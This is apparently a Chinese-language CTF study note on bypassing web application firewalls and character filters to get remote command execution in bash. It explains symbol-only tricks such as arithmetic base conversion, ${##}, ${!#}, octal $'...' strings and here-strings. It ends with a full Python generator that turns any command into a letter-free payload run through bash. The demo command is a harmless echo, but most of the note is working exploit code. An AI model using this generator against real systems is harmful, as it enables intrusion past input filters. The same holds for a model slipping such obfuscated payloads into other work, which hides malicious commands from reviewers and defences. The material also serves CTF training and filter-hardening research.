tags:: RCE, CTFWEB/Shell/WAF绕过

- # 主要套路
	- 使用进制转换计算出数字
	- 使用数字构造出任意八进制形式的字符串
	- 使用`bash<<<'bash<<<字符串'`将字符串从八进制形式转为正常形式并执行
- # bash特性
	- 数字
		- bash可以通过`$((进制#数值))`的方式转换进制，比如说`$((2#100))`表示4
			- 其中进制和数值可以是其他的`$(())`，也可以是其他的字符串拼接而成
		- bash可以使用移位操作`1<<1`产生数字2
		- bash中`${#}`是一个值为0的变量，通过求长度`${##}`可以得到数字1
	- 字符串
		- bash中可以使用八进制表示字符串，比如`$'\154\163'`
			- 也就是`$'`加上以`\`开头的八进制，结尾加上`'`
	- 变量名
		- bash中`${!xxx}`可以将一个变量的值作为变量名
			- 比如如果`def=abc`且`abc=123`那`${!def}`等价于`${abc}`，其结果是123。
			- 所以`${!#}`取的是`${0}`，也就是`bash`字符串
			- 所以可以通过设置`__=$(())`的方式通过`${!__}`获取bash字符串
	- 命令执行
		- bash中可以通过`$0<<<"echo 1"`来执行命令
			- 可以使用`$0<<<$0\<\<\<"echo 1"`让bash二次解析，避免将整个字符串识别成命令名。
- # payload生成
	- ```python
	  def number(n):
	      if n == 0:
	          return "$((${!#}))"
	      elif n == -1:
	          return "$((~{n0}))".format(n0=number(0))
	      elif n == 1:
	          return "$((~$(($((~{n0}))$((~{n0}))))))".format(n0=number(0))
	      elif isinstance(n, int) and n < 0:
	          return "$(({}))".format("".join(number(-1) for _ in range(-n)))
	      elif isinstance(n, int) and n > 0:
	          return "$((~{}))".format(number(-n - 1))
	      else:
	          raise NotImplemented()
	  
	  
	  def bash_str_bang():
	      return "${!#}"
	  
	  def bash_str_dollarzero():
	      return "$0"
	  
	  def bash_str():
	      return bash_str_dollarzero()
	  
	  def binary_str(s):
	      """经过一次解析后得到只有0和1的字符串"""
	      assert all(c in "01" for c in s)
	      return s.replace("1", number(1)).replace("0", number(0))
	  
	  
	  def num(n: int):
	      """经过一次解析后得到一个数字"""
	      return f"$(($(({number(1)}<<{number(1)}))#{binary_str(bin(n)[2:])}))"
	  
	  
	  def string_by_hex(s: str):
	      d = {
	          "0": "0",
	          "1": "${##}",
	          "2": "$((${##}<<${##}))",
	          "3": "$(($((${##}<<${##}))#${##}${##}))",
	          "4": "$((${##}<<$((${##}<<${##}))))",
	          "5": "$(($((${##}<<${##}))#${##}0${##}))",
	          "6": "$(($((${##}<<${##}))#${##}${##}0))",
	          "7": "$(($((${##}<<${##}))#${##}${##}${##}))",
	      }
	      payload = "$\\'"
	      for c in s:
	          c = oct(ord(c))[2:].zfill(3)
	          payload += "\\\\" + "".join(d[dig] for dig in c)
	      return payload + "\\'"
	  
	  
	  def string_by_bin(s: str):
	      return "$\\'" + "".join(["\\\\" + num(int(oct(ord(c))[2:])) for c in s]) + "\\'"
	  
	  
	  def string(s: str):
	      """生成一个payload, 其经过两次解析后得到原有的字符串
	      经过一次解析：
	          "$\\'" -> "$'"
	          "\\\\" -> "\\"
	          数字payload -> 实际的数字
	          整个payload变成`$'\000\000'`的形式
	  
	      Args:
	          s (str): payload的值
	  
	      Returns:
	          str: payload
	      """
	      return string_by_hex(s)
	  
	  
	  def payload(cmd):
	      return "{zero}<<<{zero}\\<\\<\\<{cmd}".format(zero=bash_str(), cmd=string(cmd))
	  
	  
	  def echo_payload(cmd):
	      return "echo {zero}\\<\\<\\<{cmd}".format(zero=bash_str(), cmd=string(cmd))
	  
	  
	  print(payload("echo 114514"))
	  ```
-